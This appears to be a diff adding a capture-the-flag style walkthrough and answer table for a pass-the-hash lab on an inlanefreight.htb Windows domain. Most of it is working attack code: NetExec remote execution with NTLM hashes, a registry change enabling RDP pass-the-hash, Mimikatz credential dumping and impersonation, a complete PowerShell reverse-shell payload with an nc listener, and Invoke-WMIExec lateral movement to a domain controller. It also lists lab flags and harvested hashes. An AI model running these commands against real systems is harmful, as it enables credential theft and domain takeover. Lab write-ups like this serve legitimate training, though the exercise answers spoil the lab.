@@ -275,7 +275,156 @@ When enabled (value `1`, disabled by default), **RID-500 is enrolled in UAC prot
 
 ## Exercise
 
-*Add exercise answers here as you complete them*
+### Exercise Answers
+
+| # | Question | Answer |
+|---|----------|--------|
+| 1 | Contents of `C:\pth.txt` (PtH as `Administrator`) | `G3t_4CCE$$_V1@_PTH` |
+| 2 | Registry value to enable PtH over RDP (set to `0`) | `DisableRestrictedAdmin` |
+| 3 | David's NTLM/RC4 hash (Mimikatz `sekurlsa::logonpasswords`) | `c39f2beb3d2ec06a62cb887fb391dee0` |
+| 4 | Contents of `\\DC01\david\david.txt` (PtH as david) | `D3V1d_Fl5g_is_Her3` |
+| 5 | Contents of `\\DC01\julio\julio.txt` (PtH as julio) | `JuL1()_SH@re_fl@g` |
+| 6 | Contents of `C:\julio\flag.txt` on DC01 (Invoke-WMIExec rev shell) | `JuL1()_N3w_fl@g` |
+
+---
+
+## 🎯 Walkthrough — Full PtH Chain on `inlanefreight.htb`
+
+Worked example: pivot from external attacker → MS01 local Administrator → julio → DC01 via PtH using **Mimikatz**, **NetExec**, **xfreerdp**, and **Invoke-TheHash**.
+
+### Lab Topology
+
+| Host | Internal IP | External IP | Role |
+|---|---|---|---|
+| Kali (attacker) | n/a | n/a | Source |
+| MS01 | `172.16.1.5` | `10.129.204.23` | Member server (entry point) |
+| DC01 | `172.16.1.10` | (internal only) | Domain Controller — **only reachable from MS01** |
+
+Starting credential: local `Administrator` NTLM hash on MS01 → `30B3783CE2ABF1AF70F77D0660CF3453`
+
+### Step 1 — PtH read of a flag file (NetExec one-shot)
+
+```bash
+nxc smb 10.129.204.23 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453 \
+    --local-auth -x "type C:\pth.txt"
+```
+✅ → `G3t_4CCE$$_V1@_PTH` (also confirms `(Pwn3d!)` — local admin via PtH).
+
+### Step 2 — Enable Restricted Admin Mode for RDP PtH
+
+By default xfreerdp PtH fails on Windows with *"Account restrictions prevent signing in..."*. Toggle the registry:
+
+```bash
+nxc smb 10.129.204.23 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453 --local-auth \
+  -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
+```
+
+Then connect RDP with the hash:
+
+```bash
+xfreerdp /v:10.129.204.23 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
+```
+
+> 🔑 Registry value: **`DisableRestrictedAdmin`** (set to `0` to allow PtH RDP).
+
+### Step 3 — Dump cached creds with Mimikatz inside RDP
+
+In PowerShell, `mimikatz.exe` won't run from `cd` — must prefix with `.\`:
+
+```powershell
+cd C:\tools
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+```
+
+Look for the `User Name : david` block — copy the `NTLM` value.
+This box yielded:
+- `david` → `c39f2beb3d2ec06a62cb887fb391dee0`
+- `julio` → `64f12cddaa88057e06a81b54e73b949b`
+- `john` → `c4b0e1b10c7ce2c4723b4e2407ef81a2`
+
+### Step 4 — PtH spawn shell as david → read `\\DC01\david\david.txt`
+
+In RDP cmd:
+```cmd
+C:\tools\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:david /domain:inlanefreight.htb /ntlm:c39f2beb3d2ec06a62cb887fb391dee0 /run:cmd.exe" exit
+```
+A second cmd window opens; in **that** window:
+```cmd
+type \\DC01\david\david.txt
+```
+✅ → `D3V1d_Fl5g_is_Her3`
+
+### Step 5 — Repeat for julio → read `\\DC01\julio\julio.txt`
+
+```cmd
+C:\tools\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:julio /domain:inlanefreight.htb /ntlm:64f12cddaa88057e06a81b54e73b949b /run:cmd.exe" exit
+```
+```cmd
+type \\DC01\julio\julio.txt
+```
+✅ → `JuL1()_SH@re_fl@g`
+
+### Step 6 — Lateral move to DC01 via Invoke-TheHash + reverse shell
+
+DC01 has **no route to the attacker box** — only to MS01 (`172.16.1.5`). So the listener must run **on MS01**, and the rev-shell payload must call back to MS01's internal IP.
+
+#### 6a. Generate base64 PowerShell rev-shell payload (on Kali)
+
+```bash
+PAYLOAD='$client = New-Object System.Net.Sockets.TCPClient("172.16.1.5",8001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+echo -n "$PAYLOAD" | iconv -t UTF-16LE | base64 -w0
+```
+
+> ⚠️ **Common typo:** I once wrote `$sendbyte = ([text.encoding]::ASCII).GetBytes($sendbyte2)` — must be `$sendback2`. The connection will succeed but no command output returns. Always verify the variable names match.
+
+#### 6b. Start nc listener on MS01 (in a new cmd window inside RDP)
+
+```powershell
+cd C:\tools
+.\nc.exe -lvnp 8001
+```
+
+#### 6c. PtH spawn PowerShell as julio (in original RDP cmd)
+
+```cmd
+C:\tools\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:julio /domain:inlanefreight.htb /ntlm:64f12cddaa88057e06a81b54e73b949b /run:powershell.exe" exit
+```
+
+#### 6d. In the spawned PS, fire Invoke-TheHash → DC01
+
+```powershell
+cd C:\tools\Invoke-TheHash
+Import-Module .\Invoke-TheHash.psd1
+Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio `
+  -Hash 64f12cddaa88057e06a81b54e73b949b `
+  -Command "powershell -e <BASE64_PAYLOAD>"
+```
+
+Output: `[+] Command executed with process ID <pid> on DC01`
+
+#### 6e. Catch the shell + read flag
+
+In the nc window:
+```
+connect to [172.16.1.5] from (UNKNOWN) [172.16.1.10] 49763
+type C:\julio\flag.txt
+JuL1()_N3w_fl@g
+```
+
+✅ Full DC01 compromise via chained PtH + Invoke-TheHash.
+
+---
+
+### 📝 Lessons Learned
+
+1. **NetExec `--local-auth -x` is the fastest one-shot** for PtH file reads — no shell needed.
+2. **`DisableRestrictedAdmin = 0`** is required server-side for `xfreerdp /pth:` to work.
+3. **PowerShell doesn't auto-run executables from CWD** — always prefix with `.\` (`.\mimikatz.exe`, `.\nc.exe`).
+4. **Mimikatz `sekurlsa::pth` spawns a NEW window** running as the impersonated user. Run share/file commands in *that* window, not the original.
+5. **Pivoting to an isolated DC**: when DC01 only routes to MS01, the listener must live on MS01 and the payload must target MS01's internal IP (`172.16.1.5` here, not the attacker's IP).
+6. **Invoke-TheHash returns** `Command executed with process ID N` immediately — confirmation only that the WMI exec succeeded; the rev shell appears in the listener seconds later.
+7. **Verify rev-shell payloads carefully** — typos like `$sendbyte2` vs `$sendback2` produce a "live" connection where commands run but no output returns.
+8. **Hashes harvested from `sekurlsa::logonpasswords`** = every cached interactive/service logon — reuse them across the domain via Invoke-TheHash, NetExec, or Impacket.
 
 ---
 
